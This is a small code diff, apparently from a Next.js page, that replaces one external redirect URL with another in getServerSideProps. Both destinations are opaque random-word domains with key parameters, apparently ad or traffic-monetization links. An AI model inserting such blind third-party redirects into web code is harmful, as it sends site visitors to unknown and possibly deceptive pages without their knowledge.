@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://joggingavenge.com/t30fxrdk?key=f932001c128fd297530058658fbb119c/`
+					`https://alfredvariablecavalry.com/b41p46bw?key=3ffd96d85639d39582a6c54713443ba6/`
 				}`,
 			},
 		};
